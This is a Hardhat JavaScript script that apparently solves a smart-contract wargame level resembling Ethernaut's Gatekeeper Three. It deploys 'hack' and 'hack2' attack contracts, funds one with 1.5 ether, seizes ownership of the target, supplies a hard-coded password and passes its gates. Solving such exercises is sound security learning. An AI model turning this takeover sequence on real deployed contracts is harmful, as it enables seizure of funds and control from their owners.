// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// You can also run a script with `npx hardhat run <script>`. If you do that, Hardhat
// will compile your contracts, add the Hardhat Runtime Environment's members to the
// global scope, and execute the script.
const hre = require("hardhat");

async function main() {
    const password="1685752428"
    const gkeeperAddr='0x9164F267f778274a63211AbEEA5977d7397354D4'
    const Hack = await hre.ethers.getContractFactory("hack");
    const hack=await Hack.deploy(gkeeperAddr)
    await hack.deployed()
    console.log("Hack deployed at",hack.address)
   
    
    const amount = hre.ethers.utils.parseEther("1.5")
    const Hack2 = await hre.ethers.getContractFactory("hack2");
    const hack2=await Hack2.deploy(gkeeperAddr,{value:amount})
    await hack2.deployed()
    console.log("Hack-2 deployed at",hack2.address)
    await hack2.crashGateII()

    await hack.gainOwnership();
    await hack.gainAllowance(password)
    await hack.enter();
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
